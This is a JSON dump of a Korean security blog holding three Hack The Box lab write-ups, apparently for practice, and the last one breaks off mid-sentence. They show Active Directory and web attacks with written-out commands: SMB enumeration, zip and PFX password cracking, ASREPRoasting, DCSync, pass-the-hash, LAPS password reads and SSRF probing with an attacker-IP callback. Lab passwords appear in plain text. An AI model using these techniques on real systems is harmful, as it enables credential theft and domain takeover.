{"componentChunkName":"component---src-pages-search-jsx","path":"/search/","result":{"data":{"allMarkdownRemark":{"nodes":[{"excerpt":"Timelapse 요약  🌟한 줄 평\n  이나  등의 색다른(?)파일의 해시 크래킹을 배울 수 있어서 좋았고, LAPS 비밀번호 읽는 법을 배울 수 있었다. Timelapse는 쉬운 난이도의 윈도우즈 시스템으로, 공개적으로 액세스 가능한 SMB쉐어에 zip파일을 가지고 있다. zip파일을 추출하면 암호화된 PFX파일을 얻을 수 있으며 이것을 John이 읽…","fields":{"slug":"/Timelapse/"},"frontmatter":{"date":"February 10, 2025","title":"Timelapse","tags":["HTB","LAPS","john","해시 크랙","SMB","윈도우즈"]},"rawMarkdownBody":"## Timelapse 요약\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/594c0449-cf6f-47cf-9a96-362af9c47fd6/image.png)\n\n> 🌟**한 줄 평**\n>  `.zip` 이나 `.pfx` 등의 색다른(?)파일의 해시 크래킹을 배울 수 있어서 좋았고, LAPS 비밀번호 읽는 법을 배울 수 있었다.\n\nTimelapse는 쉬운 난이도의 윈도우즈 시스템으로, 공개적으로 액세스 가능한 SMB쉐어에 zip파일을 가지고 있다. zip파일을 추출하면 암호화된 PFX파일을 얻을 수 있으며 이것을 John이 읽을 수 있는 해시 형식으로 변환하면 SSL 인증서와 개인 키를 얻을 수 있다. \n\nWinRM을 통해 시스템 초입을 하면 사용자 로그인 자격 증명이 포함된 파워쉘 히스토리 파일을 볼 수 있다. 권한상승을 위한 정보수집 진행 시, 사용자가 `LAPS_Readers` 그룹의 일원임을 알 수 있고. 이 그룹은 LAPS를 이용하여 도메인내 컴퓨터의 로컬 비밀번호를 읽을 수 있다. 이 신뢰를 남용하여 관리자로 권한상승이 가능하다.  \n\n## 정보 수집\n### Nmap 포트 스캔\n```sh\nPORT      STATE SERVICE       REASON  VERSION\n53/tcp    open  domain?       syn-ack\n88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2024-08-11 09:51:03Z)\n135/tcp   open  msrpc         syn-ack Microsoft Windows RPC\n139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn\n389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n445/tcp   open  microsoft-ds? syn-ack\n464/tcp   open  kpasswd5?     syn-ack\n593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0\n636/tcp   open  tcpwrapped    syn-ack\n3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)\n3269/tcp  open  tcpwrapped    syn-ack\n5986/tcp  open  ssl/http      syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)\n```\n- 139,445 SMB 포트가 열린 것을 확인할 수 있다. \n- 5986 ssl/http가 열린 것을 확인할 수 있다. \n\n구글링을 해보면 [마이크로소프트의 페이지](https://learn.microsoft.com/en-us/troubleshoot/windows-client/system-management-components/configure-winrm-for-https)에서 아래와 같은 내용을 볼 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/b549bca7-b6b0-40b5-851c-a3cc0677f706/image.png)\n\nSSL을 사용하는 WinRM 이라고. \n\n### SMB\n#### winrm_backup.zip\n![](https://velog.velcdn.com/images/h3llanut3lla/post/89c4e6c8-6635-4d3c-84df-ab95c8f5ca74/image.png)\n\nnxc로 null 세션을 시도해 보았지만 성과가 없었고, 게스트 로그인을 시도했을때는 `Shares` 라는 쉐어를 읽을 권한이 있음을 확인 할 수 있다. \n\n`-M spider_plus` 플래그를 이용해 게스트 사용자로써 읽을 수 있는 파일을 json 파일로 받아 보았다. \n\n```sh\nnxc smb -u 'guest' -p '' -M spider_plus\n```\n\n```json\n{\n    \"Shares\": {\n        \"Dev/winrm_backup.zip\": {\n            \"atime_epoch\": \"2022-03-04 19:00:38\",\n            \"ctime_epoch\": \"2021-10-26 02:48:14\",\n            \"mtime_epoch\": \"2021-10-26 08:05:30\",\n            \"size\": \"2.55 KB\"\n        },\n        \"HelpDesk/LAPS.x64.msi\": {\n            \"atime_epoch\": \"2021-10-26 02:48:42\",\n            \"ctime_epoch\": \"2021-10-26 02:48:42\",\n            \"mtime_epoch\": \"2021-10-26 02:55:14\",\n            \"size\": \"1.07 MB\"\n        },\n        \"HelpDesk/LAPS_Datasheet.docx\": {\n            \"atime_epoch\": \"2021-10-26 02:48:42\",\n            \"ctime_epoch\": \"2021-10-26 02:48:42\",\n            \"mtime_epoch\": \"2021-10-26 02:55:14\",\n            \"size\": \"101.97 KB\"\n        },\n        \"HelpDesk/LAPS_OperationsGuide.docx\": {\n            \"atime_epoch\": \"2021-10-26 02:48:42\",\n            \"ctime_epoch\": \"2021-10-26 02:48:42\",\n            \"mtime_epoch\": \"2021-10-26 02:55:14\",\n            \"size\": \"626.35 KB\"\n        },\n        \"HelpDesk/LAPS_TechnicalSpecification.docx\": {\n            \"atime_epoch\": \"2021-10-26 02:48:42\",\n            \"ctime_epoch\": \"2021-10-26 02:48:42\",\n            \"mtime_epoch\": \"2021-10-26 02:55:14\",\n            \"size\": \"70.98 KB\"\n        }\n    }\n}\n```\n\n`Shares/Dev/winrm-backup.zip` 파일을 `smbclient` 를 이용해 다운받는다. 압축해제를 하려고 보니 아래와 같이 비밀번호가 필요한 것을 확인 할 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/531a45a7-7fcf-44c7-8b90-da7bc6bcbd03/image.png)\n\n```sh\n# zip파일을 john이 읽을 수 있도록 해쉬 변환\nzip2john winrm_backup.zip > hash\n\n# john을 이용해 해쉬 크랙\njohn -w=/usr/share/wordlists/rockyou.txt hash\n```\n\n위 명령어를 입력하면 아래와 같이 일반 텍스트의 비밀번호를 얻을 수 있다. \n\n- zip파일 비밀번호: `supremelegacy` \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/1c1e6529-a623-485d-be18-ca2bcce6d939/image.png)\n\n#### legacyy_dev_auth.pfx\n\n압축 해제된 파일에는 `legacyy_dev_auth.pfx` 라는 파일이 있다. PFX파일은 SSL 인증서과 개인 키를 포함하고 WinRM에서 PFX 파일을 사용 할 수 있다. \n\n[이 글](https://www.ibm.com/docs/en/arl/9.7?topic=certification-extracting-certificate-keys-from-pfx-file)을 보면 pfx에서 SSL 인증서와 개인 키를 추출하는 법을 알 수 있다. \n\n문제는 \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/355cbe65-0b63-4097-b500-827e980c28c0/image.png)\n\n이 파일 또한 비밀번호가 필요하다는 것이다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/d7c489e3-dd00-4cc9-8809-806273a3e871/image.png)\n\n비밀번호 재사용 (Password re-use)시도를 해 보았지만 안되었다. Zip파일 비밀번호를 크랙했던 것 처럼, john을 재사용 해보자. \n\n\n```sh\n# 해시 변경\npython3 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > pfx.john\n\n# 해시 크랙\njohn pfx.john -w=/usr/share/wordlists/rockyou.txt\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/d78203c3-120d-4138-b366-322001eee2ea/image.png)\n\n- `legacyy_dev_auth.pfx` 비밀번호: `thuglegacy`\n\n이제 비밀번호를 얻었으니, SSL 인증서와 개인키를 추출해보자. \n\n\n```sh\n# Pfx 파일에서 개인 키 추출\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/fa805b11-08bf-493f-a47b-224a63358dec/image.png)\n\n```sh\n# pfx file 파일에서 SSL 인증서 추출\nopenssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/664683bf-8517-470c-acd7-09222cf5efaa/image.png)\n\n## 초입\n\n현재까지 상황을 정리해보자면, \n- SSL 인증서와 개인 키 획득\n- 포트 5986이 SSL을 이용한 WinRM 이라는 것. \n\n그렇다면 SSL 인증서와 개인 키를 활용해서 Evil-WinRM을 이용하면 초입이 가능할까?\n\n```sh\nevil-winrm -i timelapse.htb -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/5e1e2cc1-b9f9-4eef-a026-29cf220bd9ef/image.png)\n\n가능하다. \n\n## 권한상승\n### svc_deploy\n\n파워쉘 히스토리 로그를 살펴보자. \n\n```powershell\n# Read history\ntype $env:APPDATA\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/37799010-c3a2-4eab-b22e-c37fd79dc7d9/image.png)\n\n상단에서 5번째, 6번째줄에서 각각 비밀번호와 사용자명을 볼 수 있다. \n\n```powershell\n# 비밀번호\n$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force\n\n# 사용자명\n$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)\n```\n\n- 사용자명: `svc_deploy`\n- 비밀번호: `E3R$Q62^12p7PLlC%KWaxuaV`\n\n그럼 이제 새로 얻은 자격증명으로 새 세션을 열여보자. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/b2cec5c0-567b-40a2-bd7f-04b1ae5f385c/image.png)\n\n### 관리자\n\n현 사용자를 열거해보자. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/679c0677-bd6b-4b4a-804a-7b725b413ef8/image.png)\n\n`Remote Management Use`는 좀 본 것 같은데, `LAPs_Readers`는 생소하다. \n\n#### LAPS\n\nLAPS는 로컬 관리자 비밀번호 솔루션이다.컴퓨터의 로컬 관리자 계정 비밀번호를 관리하고 보호하는 데 도움이 되는 윈도우즈 기능이다. \n\n[이 글](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)을 읽어보면 LAPS 비밀번호를 남용하는 법이 나온다.\n\n\n위 글을 요약 하자면:\n- LAPS용으로 구성된 대상 컴퓨터에서 `GenericAll` 또는 `AllExtendedRights` 또는 도메인 단위 동기화를 위한 `GetChanges` 및 `GetChangesInFilteredSet` 또는 `GetChangesAll`의 조합이 있는 개체를 제어할 때 사용 가능한 방법임.\n- 공격자는 컴퓨터 계정의 LAPS 비밀번호(즉, 컴퓨터 로컬 관리자의 비밀번호)를 읽을 수 있음. \n\n```powershell\n# 관리자 비밀번호 열거\nGet-ADComputer DC01 -property 'ms-mcs-admpwd'\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/ecba22e8-ba45-4d81-af03-21fee22633f9/image.png)\n\n비밀번호 획득!\n\n이제 Evil-WinRM을 이용하여 관리자 세션을 열면 된다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f203b992-43b5-40aa-b990-b034c18318f5/image.png)"},{"excerpt":"Sauna 요약  🌟 한 줄 평 액티브 디렉토리의 기본적인 공격 요소 및 정보 수집 방법들을 경험할 수 있는 시스템인데, 잘 만들었다고 소문난 Pro Labs의 Dante를 만든 제작자 (egotisticalSW)가 만든 시스템이라 그런지 핵더박스내에서도 인기가 높다.  사우나는 Active Directory 열거 및 활용 기능을 갖춘 쉬운 난이도의 윈도…","fields":{"slug":"/Sauna/"},"frontmatter":{"date":"February 09, 2025","title":"Sauna","tags":["HTB","ASREPRoasting","PtH","DCSync","윈도우즈"]},"rawMarkdownBody":"## Sauna 요약\n![](https://velog.velcdn.com/images/h3llanut3lla/post/4a06e187-1d98-4268-9540-f1c4a459e2df/image.png)\n\n> 🌟 **한 줄 평**\n>\n> 액티브 디렉토리의 기본적인 공격 요소 및 정보 수집 방법들을 경험할 수 있는 시스템인데, 잘 만들었다고 소문난 Pro Labs의 Dante를 만든 제작자 (egotisticalSW)가 만든 시스템이라 그런지 핵더박스내에서도 인기가 높다. \n\n사우나는 Active Directory 열거 및 활용 기능을 갖춘 쉬운 난이도의 윈도우즈 시스템이다. \n\n웹사이트에 나와 있는 직원 이름을 활용하여 사용자 이름 리스트를 만들어 ASREPRoasting 공격에 사용하면 컬브로스 사전 인증 (Kerberos pre-authentication)이 필요하지 않은 계정에 대한 해시를 얻을 수 있다. 이 해시를 이용하여 오프라인 무차별 대입 공격 (Offline brute force attack)을 수행 하게 되면 WinRM을 실행 할 수 있는 사용자 계정의 일반 텍스트 비밀번호를 얻을 수 있다. \n\n권한상승을 위한 정보 수집으로 WinPEAS를 실행하면 다른 시스템 사용자가 자동 로그인 설정을 해두었다는 사실과 비밀번호를 함께 확인 할 수 있다. 블러드하운드 (BloodHound)를 이용하면 이 사용자에게는 디씨씽크 (DCSync) 공격 시 도메인 컨트롤러에서 암호 해시를 덤프할 수 있는 `DS-Replication-Get-Changes-All` 확장 권한이 있다는 것을 알 수 있다. 이 공격을 실행하면 주 도메인 관리자의 해쉬를 얻을 수 있으며 이는 임패킷 (Impacket)의 피에스이그젝 (psexec.py)과 함께 사용함으로써 상승된 권한인 `NT_AUTHORITY\\SYSTEM` 으로써 쉘을 열 수 있다. \n\n## 정보 수집\n### Nmap 포트 스캔\n```sh\nPORT      STATE SERVICE                    \n53/tcp    open  domain \n80/tcp    open  http\n88/tcp    open  kerberos-sec\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n389/tcp   open  ldap\n445/tcp   open  microsoft-ds                          \n464/tcp   open  kpasswd5\n593/tcp   open  http-rpc-epmap\n636/tcp   open  ldapssl\n3268/tcp  open  globalcatLDAP              \n3269/tcp  open  globalcatLDAPssl\n5985/tcp  open  wsman\n9389/tcp  open  adws\n49667/tcp open  unknown\n49669/tcp open  unknown\n49670/tcp open  unknown\n49671/tcp open  unknown\n49681/tcp open  unknown\n64471/tcp open  unknown\n```\n- 디렉토리 퍼징 (Directory Fuzzing) 에서는 딱히 눈에 띄는 폴더는 없었다. \n- LDAP을 열거하면 도메인명 `egotistical-bank.local` 을 확인 할 수 있다. \n\n### 80-HTTP\n`http://egotistical-bank.local/about.html` 로 접속하면 직원들의 이름을 확인할 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/be597dbd-270e-439f-9379-9d46daf99b85/image.png)\n\n### 유저네임 얻기\n나중에 찾아보니 [Kerbrute](https://github.com/ropnop/kerbrute)를 활용해 좀 더 간결하고 스마트하게 사용자명을 얻는 방법이 있으나 나는 다른 방법으로 얻었다.\n\n>Kerbrute를 활용하는 방법은 [이 문제풀이](https://0xdf.gitlab.io/2020/07/18/htb-sauna.html#recon) 참조. \n\n[Username anarchy](https://github.com/urbanadventurer/username-anarchy)를 이용하여 직원들의 풀네임을 넣으면 그걸 치환해 유저네임 형식으로 바꿔주는데 다양한 형식의 유저네임 리스트를 ASREPRoasting 공격에 넣어 얻어 걸리길 기도하는 방법이다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/88c244c4-5d61-4be2-8646-8c54a7caf1cc/image.png)\n\n## ASREPRoasting / 해시 얻기\n### ASREPRoating 개념\n구글링을 하다보면 글이 길고 설명이 복잡한것들이 대부분인데, [이 포스트](https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#as-rep-roasting)가 간결하고 쉽게 잘 설명한 것 같다. \n\n위 포스트를 요약하자면, \n- 사전 인증은 Kerberos 인증의 첫 번째 단계이며 주요 역할은 무차별 암호 추측 공격을 방지하는 것임. \n- 사전 인증 절차 중, 사용자는 타임스탬프를 암호화하는데 사용할 자격증명을 입력함. \n- DC는 이를 해독하여 올바른 자격 증명이 사용되었는지 확인함. \n- DC가 승인하면 TGT를 발행.\n- 사전 인증이 비활성화되면 공격자가 _모든 _사용자에 대한 티켓을 요청할 수 있음.\n- 따라서 명시적으로 계정에 `DONT_REQ_PREAUTH` (사전 인증 비활성화) 라는 설정이 있어야 가능한 공격임. \n- 그럼 DC는 오프라인에서 크랙할 수 있는 Kerberoast 공격과 유사하게 암호화된 TGT를 반환함. \n\n우선 컬브로스 88번 포트가 열려 있고, 윈도우즈 시스템이고, 사전인증이 비활성화된 계정이 있다면 시도해볼만 한 공격인 것 같다. \n\n### ASREPRoasting 시도\n아래의 명령어를 입력해 위에서 만든 유저네임 리스트를 넣어 Impacket의 GetNPUsers를 사용해 ASREPRoasting 공격을 실행, 아웃풋으로 나온 해시를 `hash.txt` 파일에 저장한다. \n\n```sh\nwhile read p; do impacket-GetNPUsers egotistical-bank.local/\"$p\" -request -no-pass -dc-ip 10.10.10.175 >> hash.txt; done < unames.txt\n```\n\n그러면 아래와 같이 `fsmith` 사용자의 컬브로스 해쉬를 얻을 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/55f4b870-d498-48b7-969a-6d4cd964d98a/image.png)\n\n일반 텍스트 비밀번호를 얻기 위해 해쉬캣을 이용해 무차별 대입을 하면 된다. \n\n```sh\nhashcat -m 18200 fsmithhash /usr/share/wordlists/rockyou.txt --force\n```\n\n해쉬캣 모드는 `hashcat --help | grep Kerberos`를 입력해, `AS-REP` 이라고 적힌 모드 번호를 사용한다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/78b5413e-a491-483c-8936-f1744512efba/image.png)\n\n그러면 이렇게 크랙된 비밀번호를 얻을 수 있다. \n\n- 유저네임: `fsmith`\n- 비밀번호: `Thestrokes23`\n\n\n## 초입\nEvil-WinRM을 이용하여 새로 얻은 로그인 자격증명을 넣으면 초입에 성공할 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/43b2d8fa-fe29-411c-97df-7fd457d3aebf/image.png)\n\n## 권한상승\n### 정보 수집\n[WinPEAS](https://github.com/peass-ng/PEASS-ng/blob/master/winPEAS/winPEASexe/README.md)를 실행하면 아래와 같이 자동로그인이 활성화된 계정정보를 비밀번호와 함께 얻을 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7143ac67-0377-4a57-b206-1d392687d4c0/image.png)\n\n- 유저네임: `svc_loanmanager`\n- 비밀번호: `Moneymakestheworldgoround!`\n\n### 시도 \n초입 방식와 같이 새로 얻은 자격증명을 활용해 Evil WinRM을 통해 연결해보자. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/779305e0-89f4-430f-a9bf-9435496ee062/image.png)\n\n## 블러드하운드 (BloodHound)\n[블러드하운드](https://github.com/SpecterOps/BloodHound-Legacy)를 사용하면 액티브디렉토리 도메인 열거 및 시각화를 할 수 있는데 권한상승을 위한 정보 수집시 가이드 역할을 해주는 아주 유용한 툴이다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/ee48adf9-5457-41dc-af91-e94e39c5235f/image.png)\n\n`Queries` 탭에서 `Find Principals with DCSync Rights` 를 클릭하면 현 사용자가 `GetChangesAll`을 통해 도메인과 연결이 된 것을 볼 수 있다.\n\n가장자리를 우클릭하고 `Help`를 클릭하면 svc_loanmgr(현 사용자)가 DCSync 공격을 사용하여 도메인 컨트롤러에서 비밀번호 해시를 덤프할 수 있음을 알 수 있다.\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/63046407-49dc-4d39-828d-1a0461df8a88/image.png)\n\n## 디씨씽크 (DCSync)\n![](https://velog.velcdn.com/images/h3llanut3lla/post/8682c72b-2a15-43ad-984b-c520fd415b15/image.png)\n\n이렇게 하면 관리자의 해쉬를 얻을 수 있다. \n이 방법 외에도 미미켓즈 (Mimikatz)를 타겟에서 실행해 관리자 해쉬를 얻는 방법, 디씨씽크를 통해 얻은 해쉬를 Evil-WinRM에 그대로 넣어 관리자로써 연결하는 방법이 있다고 한다. \n\n## 패스더해시 (PtH)\n나는 해쉬를 임패켓 (Impacket) 피에스이그젝 (psexec.py)에 넣어 패스하는 방법을 택했다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/bb50f669-d675-4dc1-b889-b7e982d0b215/image.png)\n"},{"excerpt":"Editorial 요약  🌟 한 줄 평\n비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다.  'Editorial'은 'Server-Side Request Forgery(SSRF)'에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅…","fields":{"slug":"/Editorial/"},"frontmatter":{"date":"February 08, 2025","title":"Editorial","tags":["HTB","SSRF","git","sudo-l","SSH","리눅스"]},"rawMarkdownBody":"## Editorial 요약\n![](https://velog.velcdn.com/images/h3llanut3lla/post/fbaf8181-884b-4302-994a-4f0b91a51d79/image.png)\n\n> 🌟 **한 줄 평**\n> 비슷한 방식의 테크닉이 여러번 반복되는 느낌이 있으나, SSRF를 연습하기에 좋았고 초입까지 가는 과정이 다른 쉬운 레벨의 시스템보다 복잡해 좀 더 현실적이라는 느낌을 받았다. \n\n'Editorial'은 'Server-Side Request Forgery(SSRF)'에 취약한 웹 애플리케이션을 갖춘 쉬운 난이도의 리눅스 시스템이다. 이 취약점은 내부에서 실행되는 API의  로그인 액세스 권한을 얻기 위해 활용되며, 이는 'SSH' 액세스로 이어지는 로그인 자격 증명을 얻기 위해 활용된다. 시스템에서 정보수집을 하다보면 새로운 사용자의 로그인 자격증명을 깃 'Git' 리포지토리에서 찾을 수 있다. 'root' 사용자는 [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439) 및 `sudo` 구성을 활용하여 얻을 수 있다.\n\n## 정보수집\n### Nmap 포트 스캔\n```sh\nPORT   STATE SERVICE REASON         VERSION\n22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 0d:ed:b2:9c:e2:53:fb:d4:c8:c1:19:6e:75:80:d8:64 (ECDSA)\n| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMApl7gtas1JLYVJ1BwP3Kpc6oXk6sp2JyCHM37ULGN+DRZ4kw2BBqO/yozkui+j1Yma1wnYsxv0oVYhjGeJavM=\n|   256 0f:b9:a7:51:0e:00:d5:7b:5b:7c:5f:bf:2b:ed:53:a0 (ED25519)\n|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMXtxiT4ZZTGZX4222Zer7f/kAWwdCWM/rGzRrGVZhYx\n80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)\n|_http-title: Did not follow redirect to http://editorial.htb\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n| http-methods: \n|_  Supported Methods: GET HEAD POST OPTIONS\n```\nTCP로는 SSH와 HTTP만 열려 있다. \nSSH는 로그인 자격증명이 필요하기 때문에 HTTP부터 살펴보자. \n\n### 80-HTTP\n![](https://velog.velcdn.com/images/h3llanut3lla/post/a31f6fae-0874-41eb-ab2b-ab3a71f59169/image.png)\n\n웹사이트는 이렇게 생겼고, 한눈에 보기에 취약한 부분은 우층 상단의 서치바 정도이지만, 간단한 SQL Injection 테스트후 취약점을 발견하지 못해 정보를 더 수집해보자. \n\n#### 디렉토리 퍼징 (Directory Fuzzing)\n![](https://velog.velcdn.com/images/h3llanut3lla/post/59c0075b-62ad-4064-8b2d-b9d624c3bda7/image.png)\n\n`/upload` 와 `/about` 디렉토리를 찾았다. \n\n`/upload` 에 접속해보자. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f9f0b9c1-ca80-4254-8778-5319d945563c/image.png)\n\n상단 Book Information 아래 좌측 `Cover URL related to your book or` 란에 공격자 IP를 아래와 같이 적고 \n\n```sh\nhttp://공격자IP/test\n```\n\n넷캣 리스터 (netcat listener)를 열어둔 상태에서 \n\n```sh\nnc -lvnp 80\n```\n`Preview` 버튼을 누르면 HTTP 리퀘스트가 들어온것을 확인할 수 있다 (캡쳐 생략). 이것은 이 애플리케이션이 Server-side request forgery (SSRF)에 취약하다는것을 의미한다. \n\nBurp Suite의 Repeater를 이용해보자. \n`bookurl` 값에 로컬 IP주소를 입력하면 jpeg 이미지가 리스펀스로 돌아온다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/0759040b-bcaf-444e-aaa9-3c61aca23e49/image.png)\n\n#### 포트 퍼징 (Port Fuzzing)\n이제 내부의 호스팅된 서비스를 찾기 위해 포트 퍼징을 해보자. 찾아보니 Burp Suite의 Intruder를 이용하는 방법이 있는 것 같은데 나는 ffuf를 사용하여 퍼징하는 방법을 택했다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7fd3d79d-66ca-45e5-be2b-219d1de9758c/image.png)\n\nBurp Suite 의 Proxy 모드에서 Intercept를 클릭해 리퀘스트를 선택해주고 \n`http://127.0.0.1:FUZZ` 라고 입력한 후, 우클릭 -> `Copy to file` -> `req.txt` 라는 파일명으로 수정된 HTTP 리퀘스트 파일을 저장해준다. \n\n그리고 아래의 명령어를 입력해 포트 퍼징을 해준다. \n```sh\nffuf -u http://editorial.htb/upload-cover -X POST -request req.txt -w ports.txt -fs 61\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f4cff494-ae9a-4430-8356-c0fbf78fbf5a/image.png)\n\n5000 을 찾았다. \n\n그럼 이제 다시 기존의 Burp Suite Repeater로 돌아가서 새로 찾은 포트번호를 로컬IP에 추가해주면 \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/85014a6b-415e-4ceb-8366-10dd8ccaa9e9/image.png)\n\n우측과 같이 새로운 디렉토리가 리스펀스로 돌아보는 것을 확인할 수 있다. \n새로운 디렉토리로 가보면 저절로 파일이 다운로드 되는데 파일을 열어보면 아래와 같다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/6b33ce2c-09ed-41f1-b8f6-75fc553f591a/image.png)\n\n이걸 읽기 쉽게 json으로 포매팅 해보자. \n\n```json\n{\n  \"messages\": [\n    {\n      \"promotions\": {\n        \"description\": \"Retrieve a list of all the promotions in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/promos\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"coupons\": {\n        \"description\": \"Retrieve the list of coupons to use in our library.\",\n        \"endpoint\": \"/api/latest/metadata/messages/coupons\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"new_authors\": {\n        \"description\": \"Retrieve the welcome message sended to our new authors.\",\n        \"endpoint\": \"/api/latest/metadata/messages/authors\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"platform_use\": {\n        \"description\": \"Retrieve examples of how to use the platform.\",\n        \"endpoint\": \"/api/latest/metadata/messages/how_to_use_platform\",\n        \"methods\": \"GET\"\n      }\n    }\n  ],\n  \"version\": [\n    {\n      \"changelog\": {\n        \"description\": \"Retrieve a list of all the versions and updates of the api.\",\n        \"endpoint\": \"/api/latest/metadata/changelog\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"latest\": {\n        \"description\": \"Retrieve the last version of api.\",\n        \"endpoint\": \"/api/latest/metadata\",\n        \"methods\": \"GET\"\n      }\n    }\n  ]\n}\n```\n이중 `/api/latest/metadata/messages/authors`를 리퀘스트로 보내면 새로운 디렉토리가 리스펀스로 돌아오게 된다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7814a566-da48-4612-818a-c34e16959f1c/image.png)\n\n그리고 이전과 같이 리스펀스로 돌아온 디렉토리로 접속하면 자동으로 파일이 다운로드 된다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/10a080ea-88d4-4165-8365-6234f1840770/image.png)\n\n그리고 다운로드된 파일을 열어보면 아래와 같은 로그인 자격증명을 획득할 수 있다.\n- 유저네임 `dev` \n- 비밀번호 `dev080217_devAPI!@`  \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/9cf4cb93-6506-4cd4-8f64-c2652f7b0307/image.png)\n\n## 초입\n얻은 로그인 자격증명을 이용해 SSH에 연결해보자.\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/e9265bde-e6c4-4931-8437-6ca01f2ca296/image.png)\n\n## 측면 이동 (Lateral Movement)\n`~/apps` 에 깃(git)이 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/54649a1e-bf6a-483a-b6a9-a916deb0989e/image.png)\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/788c8a3f-16d3-4664-9861-ed8b7d8b549f/image.png)\n\n`~/apps/.git/logs` 에서 하이라이트된 부분을 아래의 명령어를 이용해 자세히 살펴보자. \n\n```sh\ngit show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\n```\n그러면 아래와 같은 탬플렛 메일 메세지 `template_mail_message` 내용을 볼 수 있고, 이전과 같이 새로운 로그인 자격증명을 얻을 수 있다. \n\n- 유저네임: `prod`\n- 비밀번호: `080217_Producti0n_2023!@`\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/87696c9a-acce-4d0b-8747-8639d7ba44c0/image.png)\n\n새로 얻은 로그인 자격증명을 이용해 SSH에 연결하자. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/db395340-5adc-4aa7-9a8c-a999255c9d1a/image.png)\n\n## 권한 상승 (Privilege Escalation)\n슈퍼유저로 실행할 수 있는 권한을 확인하기 위해 `sudo -l` 를 살펴보면\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/98018cdc-2259-4e1c-8297-02d39f4fd425/image.png)\n\n`/opt/internal_apps/clone_changes/clone_prod_change.py *` 파이썬 파일을 권한 상승없이 실행 시킬 수 있다는 것을 확인할 수 있다. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/e05aaac8-1689-405e-b57f-655b19f5cd5b/image.png)\n\n여기서 중요한 부분은 아래와 같다. \n\n```python\nfrom git import Repo\n```\n\n이 스크립트가 GitPython 라이브러리를 활용하여 Git 